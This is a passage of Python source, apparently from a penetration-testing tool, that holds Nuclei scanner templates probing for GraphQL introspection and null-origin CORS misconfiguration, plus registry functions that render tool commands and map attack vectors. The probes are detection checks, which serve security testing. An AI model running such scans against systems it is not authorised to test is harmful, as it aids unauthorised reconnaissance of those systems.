        POST {{BaseURL}}/graphql HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"query":"{__schema{queryType{name}mutationType{name}types{name fields{name}}}}"}
    matchers:
      - type: word
        words:
          - "__schema"
          - "queryType"
        condition: and
"""

    # CORS advanced (null origin + subdomain)
    templates["cors-advanced.yaml"] = """id: pentra-cors-advanced
info:
  name: Advanced CORS Misconfiguration
  author: pentra
  severity: high
  tags: cors,misconfig
  description: Tests null origin and subdomain wildcard CORS misconfigs

http:
  - raw:
      - |
        GET {{BaseURL}} HTTP/1.1
        Host: {{Hostname}}
        Origin: null
    matchers:
      - type: word
        part: header
        words:
          - "Access-Control-Allow-Origin: null"
"""

    return templates


# ═══════════════════════════════════════════════════════════════════════
#  REGISTRY API — query and use the catalog
# ═══════════════════════════════════════════════════════════════════════

def get_tool(tool_id: str) -> ToolDefinition | None:
    """Get a tool definition by ID."""
    return TOOL_CATALOG.get(tool_id)


def get_tools_for_category(category: str) -> list[ToolDefinition]:
    """Get all tools in a category."""
    return [t for t in TOOL_CATALOG.values() if t.category == category]


def get_all_tool_ids() -> list[str]:
    """Get all registered tool IDs."""
    return list(TOOL_CATALOG.keys())


def get_attack_coverage() -> dict[str, list[str]]:
    """Map each attack vector to the tools that cover it."""
    coverage: dict[str, list[str]] = {}
    for tool in TOOL_CATALOG.values():
        for vector in tool.attack_vectors:
            coverage.setdefault(vector, []).append(tool.tool_id)
    return coverage


def render_command(tool_id: str, phase_name: str, ctx_vars: dict[str, Any]) -> list[str] | None:
    """Render a tool phase's command with context variables."""
    tool = TOOL_CATALOG.get(tool_id)
    if not tool:
        return None
    for phase in tool.phases:
        if phase.name == phase_name:
            return _ctx(phase.command_template, ctx_vars)
    return None


def get_all_attack_vectors() -> list[str]:
    """Return all attack vectors covered by the tool catalog."""
    vectors: set[str] = set()
    for tool in TOOL_CATALOG.values():
        vectors.update(tool.attack_vectors)
    return sorted(vectors)
